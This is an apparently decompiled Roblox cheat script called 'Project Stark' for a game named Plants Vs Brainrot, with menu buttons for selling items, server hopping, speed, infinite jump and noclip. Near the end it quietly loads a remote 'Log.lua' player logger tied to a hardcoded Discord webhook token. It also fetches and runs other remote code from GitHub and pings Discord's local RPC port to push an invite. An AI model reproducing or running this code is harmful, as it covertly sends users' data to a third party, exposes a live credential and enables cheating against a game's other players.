local v1 = {}
local _ = require
v1["script.lua"] = function()
	local v_u_2 = game:GetService("Players").LocalPlayer:FindFirstChild("Project Stark Key Check")
	local v_u_3 = false
	local function v6(p_u_4)
		pcall(function()
			-- upvalues: (ref) p_u_4
			local v5 = game:GetService("HttpService");
			(syn and syn.request or request)({
				["Url"] = "http://127.0.0.1:6463/rpc?v=1",
				["Method"] = "POST",
				["Headers"] = {
					["Content-Type"] = "application/json",
					["Origin"] = "https://discord.com"
				},
				["Body"] = v5:JSONEncode({
					["cmd"] = "INVITE_BROWSER",
					["args"] = {
						["code"] = p_u_4
					},
					["nonce"] = v5:GenerateGUID(false)
				})
			})
		end)
	end
	local v7 = false
	if true then
		if v_u_2 and v_u_2.Value == true then
			pcall(function()
				-- upvalues: (ref) v_u_2
				v_u_2:Destroy()
				warn("Urbanstorn was here")
			end)
			v7 = true
		else
			pcall(function()
				loadstring(game:HttpGet("https://raw.githubusercontent.com/Urbanstormm/Project-Stark/main/Main.lua"))()
			end)
			v6("vgYZApyrZC")
		end
	else
		warn("[Project Stark] Key check DISABLED")
		v7 = true
	end
	if v7 then
		local v8 = loadstring(game:HttpGet("https://raw.githubusercontent.com/Urbanstormm/Project-Stark/main/UiLib.lua"))():Window("Project Stark\n\225\180\190\203\161\225\181\131\226\129\191\225\181\151\203\162 \225\181\155\203\162 \225\180\174\202\179\225\181\131\226\129\177\226\129\191\202\179\225\181\146\225\181\151\203\162", Color3.fromRGB(120, 81, 169))
		local v9 = v8:Tab("Main")
		v9:Button("Sell Brainrots", function()
			game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("ItemSell"):FireServer()
		end)
		v9:Button("Sell Plants", function()
			game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("ItemSell"):FireServer()
		end)
		v9:Button("Check Item Worth", function()
			game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CheckWorth"):FireServer()
		end)
		local v10 = v8:Tab("Extras")
		v10:Button("Admin", function()
			loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source", true))()
		end)
		v10:Button("Server Hop", function()
			local v_u_11 = game.PlaceId
			local v_u_12 = {}
			local v_u_13 = ""
			local v_u_14 = os.date("!*t").hour
			if not pcall(function()
				-- upvalues: (ref) v_u_12
				v_u_12 = game:GetService("HttpService"):JSONDecode(readfile("NotSameServers.json"))
			end) then
				table.insert(v_u_12, v_u_14)
				writefile("NotSameServers.json", game:GetService("HttpService"):JSONEncode(v_u_12))
			end
			function TPReturner()
				-- upvalues: (ref) v_u_13, (ref) v_u_11, (ref) v_u_12, (ref) v_u_14
				local v15
				if v_u_13 ~= "" then
					v15 = game.HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/" .. v_u_11 .. "/servers/Public?sortOrder=Asc&limit=100&cursor=" .. v_u_13))
				else
					v15 = game.HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/" .. v_u_11 .. "/servers/Public?sortOrder=Asc&limit=100"))
				end
				if v15.nextPageCursor and (v15.nextPageCursor ~= "null" and v15.nextPageCursor ~= nil) then
					v_u_13 = v15.nextPageCursor
				end
				local v16, v17, v18 = pairs(v15.data)
				local v19 = 0
				while true do
					local v20
					v18, v20 = v16(v17, v18)
					if v18 == nil then
						break
					end
					local v21 = true
					local v_u_22 = tostring(v20.id)
					if tonumber(v20.maxPlayers) > tonumber(v20.playing) then
						local v23, v24, v25 = pairs(v_u_12)
						while true do
							local v26
							v25, v26 = v23(v24, v25)
							if v25 == nil then
								break
							end
							if v19 == 0 then
								if tonumber(v_u_14) ~= tonumber(v26) then
									pcall(function()
										-- upvalues: (ref) v_u_12, (ref) v_u_14
										delfile("NotSameServers.json")
										v_u_12 = {}
										table.insert(v_u_12, v_u_14)
									end)
								end
							elseif v_u_22 == tostring(v26) then
								v21 = false
							end
							v19 = v19 + 1
						end
						if v21 == true then
							table.insert(v_u_12, v_u_22)
							wait()
							pcall(function()
								-- upvalues: (ref) v_u_12, (ref) v_u_11, (ref) v_u_22
								writefile("NotSameServers.json", game:GetService("HttpService"):JSONEncode(v_u_12))
								wait()
								game:GetService("TeleportService"):TeleportToPlaceInstance(v_u_11, v_u_22, game.Players.LocalPlayer)
							end)
							wait(4)
						end
					end
				end
			end
			function Teleport()
				-- upvalues: (ref) v_u_13
				while wait() do
					pcall(function()
						-- upvalues: (ref) v_u_13
						TPReturner()
						if v_u_13 ~= "" then
							TPReturner()
						end
					end)
				end
			end
			Teleport()
		end)
		v10:Button("Anti-Afk - Already Running", function()
			print("Why are you clicking the anti-afk button lmao")
		end)
		v10:Toggle("Infinite Jump", function(p27)
			InfJump = p27
			if InfJumpStarted == nil then
				InfJumpStarted = true
				local v28 = game:GetService("Players").LocalPlayer
				local v29 = v28:GetMouse()
				local v_u_30 = v28.Character:WaitForChild("Humanoid")
				v29.KeyDown:Connect(function(p31)
					-- upvalues: (ref) v_u_30
					if InfJump and p31:byte() == 32 then
						v_u_30:ChangeState("Jumping")
						wait()
						v_u_30:ChangeState("Seated")
					end
				end)
			end
		end)
		local v_u_32 = 40
		v10:Slider("Player Speed", 20, 200, 23, function(p33)
			-- upvalues: (ref) v_u_32
			v_u_32 = p33
			game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = v_u_32
		end)
		local v34 = v8:Tab("Credits")
		v34:Button("Made by Urbanstorm", function()
			pcall(function()
				setclipboard("Urbanstorm")
			end)
		end)
		v34:Button("https://discord.gg/vgYZApyrZC - Click to copy", function()
			pcall(function()
				setclipboard("https://discord.gg/vgYZApyrZC")
			end)
		end)
		task.spawn(function()
			-- upvalues: (ref) v_u_32
			(function()
				-- upvalues: (ref) v_u_32
				while true do
					pcall(function()
						-- upvalues: (ref) v_u_32
						wait(0.5)
						if game.Players.LocalPlayer.Character.Humanoid.WalkSpeed ~= v_u_32 then
							game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = v_u_32
						end
					end)
				end
			end)()
		end)
		task.spawn(function()
			pcall(function()
				game.Players.LocalPlayer.CameraMaxZoomDistance = 1000
				local v35 = game:GetService("Players").LocalPlayer:WaitForChild("PlayerScripts").PlayerModule.CameraModule.ZoomController.Popper
				local v36 = next
				local v37, v38 = getgc()
				while true do
					local v39
					v38, v39 = v36(v37, v38)
					if v38 == nil then
						break
					end
					if getfenv(v39).script == v35 and typeof(v39) == "function" then
						local v40 = next
						local v41, v42 = debug.getconstants(v39)
						while true do
							local v43
							v42, v43 = v40(v41, v42)
							if v42 == nil then
								break
							end
							if tonumber(v43) ~= 0.25 then
								if tonumber(v43) == 0 then
									debug.setconstant(v39, v42, 0.25)
								end
							else
								debug.setconstant(v39, v42, 0)
							end
						end
					end
				end
				local v44, v45, v46 = pairs(game.Players.LocalPlayer.Character:GetChildren())
				while true do
					local v47
					v46, v47 = v44(v45, v46)
					if v46 == nil then
						break
					end
					if v47.ClassName == "Part" or v47.ClassName == "MeshPart" then
						v47.CanCollide = false
					end
				end
			end)
		end)
		task.spawn(function()
			pcall(function()
				local v_u_48 = game:GetService("VirtualUser")
				game:GetService("Players").LocalPlayer.Idled:connect(function()
					-- upvalues: (ref) v_u_48
					v_u_48:Button2Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
					wait(1)
					v_u_48:Button2Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
				end)
			end)
		end)
		task.spawn(function()
			-- upvalues: (ref) v_u_3
			pcall(function()
				-- upvalues: (ref) v_u_3
				if v_u_3 ~= false then
					warn("[Project Stark] Logger DISABLED")
				else
					getgenv().Webyhookie = "https://discord.com/api/webhooks/1428748352442335293/Dff9KdSuAtdHGWaLHnpBHfkGfF2UxGLobr0eUzz3enfM8thYzKLQP4FjUc4HTqD-Yvlo"
					getgenv().Titlewebyhookie = "\240\159\154\168 Plants Vs Brainrot \226\128\147 Player Logger"
					loadstring(game:HttpGet("https://raw.githubusercontent.com/Urbanstormm/Project-Stark/main/Log.lua"))()
				end
			end)
		end)
	end
end
return v1["script.lua"](...)
